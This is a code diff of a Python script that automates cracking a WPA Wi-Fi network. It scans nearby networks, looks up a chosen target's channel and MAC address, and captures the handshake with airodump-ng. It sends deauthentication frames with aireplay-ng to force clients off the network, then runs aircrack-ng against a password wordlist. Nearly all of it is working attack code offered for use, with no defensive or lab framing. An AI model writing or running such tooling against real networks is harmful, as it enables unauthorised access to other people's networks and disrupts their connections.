@@ -1,6 +1,21 @@
 from os import system
 from time import sleep
+import subprocess
 import csv
+import os
+import signal
+
+# Ask for name of scan for creating directory
+directory_name = input("Enter the project name")
+
+# Create directory for all files created during the attack
+fullPath = os.getcwd()+"/"+directory_name
+try:
+    os.mkdir(fullPath)
+except OSError:
+    print("The directory "+fullPath+" could not be created")
+else:
+    print("The directory "+fullPath+" was created")
 
 
 # asks for wireless card to apply monitor mode on it
@@ -10,14 +25,13 @@ wireless_card = input("Enter your wireless card: ")
 mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
 system(mon0)
 
-file_name = input("Enter the CSV file name: ")
-
+csvpath = fullPath+"/"+directory_name
 # runs a scan with airodump-ng to get available wifi
-airodump = 'timeout 10s airodump-ng -w '+file_name+' --output-format csv '+wireless_card
+airodump = 'timeout 5s airodump-ng -w '+csvpath+' --output-format csv '+wireless_card
 system(airodump)
 
-with open(file_name+'-01.csv', 'rb') as csvfile:
-    wifireader = csv.reader(csvfile, delimiter=' ', quotechar='|')
+with open(csvpath+'-01.csv', 'r') as csvfile:
+    wifireader = csv.reader(csvfile, delimiter=' ', quotechar='|', skipinitialspace=True)
     for row in wifireader:
         print(', '.join(row))
 
@@ -25,22 +39,44 @@ with open(file_name+'-01.csv', 'rb') as csvfile:
 # asks for your target's bssid
 bssid = input("Enter the BSSID of the network you want to crack: ")
 
-# asks for your target's channel
-channel = input("Enter the channel number that the wireless network is currently running on: ")
-save = input("Where should i save the captured handshake? ")
-print ("..."),
+#ugly fix but takes care of the extra space I get from reading out the csv TODO make pretty
+#bssid = " "+bssid
+
+channel = None
+mac_address = None
+
+with open(csvpath+'-01.csv', 'r') as csvfile2:
+    reader = csv.reader(csvfile2,skipinitialspace=True)
+    next(reader,None)
+    for row in reader:
+        if str(row[13]) == bssid:
+            channel = row[3]
+            mac_address = row[0]
+            print("SSID \'"+bssid+"\' found on channel "+channel+" with MAC-address "+mac_address)
+            break
+
+
+
 print ("Airodump will start, in the meanwhile, run deauth.py in a new terminal")
-sleep(5)
+sleep(2)
 
 # starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
-airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
-system(airodump2)
-print("Handshake is captured")
+airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, mac_address, csvpath+"_handshake", wireless_card)
+airodump_subprocess = subprocess.Popen(airodump2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
+sleep(5)
+# Deauthenticate the access point
+deauth = "aireplay-ng -0 {0} -a {1} -c {2} {3}".format(5,bssid,mac_address,wireless_card)
+deauth_subprocess = subprocess.Popen(deauth, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
+#Popen(deauth, shell=True)
+
+os.killpg(os.getpgid(deauth_subprocess.pid), signal.SIGTERM)
+sleep(10)
+os.killpg(os.getpgid(airodump_subprocess.pid), signal.SIGTERM)
+sleep(2)
 print("Cracking the handshake with aircrack-ng is starting...")
 
 # 'Aircrack-ng' parameters set
-wordlist = input("Specify the path to your wordlist dictionary: ")
-save2 = input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
+#wordlist = input("Specify the path to your wordlist dictionary: ")
 print ("This could take a while according to the wordlist you are using, so be patient!")
-crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
+crack = 'aircrack-ng -a 2 {0} -w {1} '.format(csvpath+"_handshake-01.cap", "/usr/share/wordlists/metasploit/password.lst")
 system(crack)
